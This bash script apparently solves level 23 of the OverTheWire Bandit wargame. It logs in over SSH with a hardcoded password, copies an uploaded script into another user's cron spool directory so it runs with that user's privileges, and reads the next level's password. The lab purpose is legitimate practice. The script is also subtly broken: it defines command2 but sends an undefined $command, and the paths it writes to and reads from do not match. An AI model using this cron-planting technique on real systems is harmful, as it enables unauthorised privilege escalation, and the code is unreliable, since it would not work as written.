#!/bin/bash

level=23
bandit_host="bandit.labs.overthewire.org"
bandit_user="bandit$level"
bandit_pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
temp_dir=/tmp/mytwentythreefolder

# Get env ready
command1="mkdir $temp_dir"
sshpass -p "$bandit_pass" ssh $bandit_user@$bandit_host -p 2220 "$command1"

# PUSH cron script
sshpass -p "$bandit_pass" scp -P 2220 ./helpers/23_cron_script.sh $bandit_user@$bandit_host:/$temp_dir/cron.sh

# Get pass
command2="chmod 777 $temp_dir/cron.sh && cp $temp_dir/cron.sh /var/spool/bandit24/cron.sh && sleep 60 && cat /tmp/boopbeep23/23_pass.txt"

next_bandit_pass=$(sshpass -p "$bandit_pass" ssh $bandit_user@$bandit_host -p 2220 "$command")
next_bandit_pass=$(echo $next_bandit_pass | awk '{print $NF}')

echo "Bandit$(($level+1)) Password: $next_bandit_pass"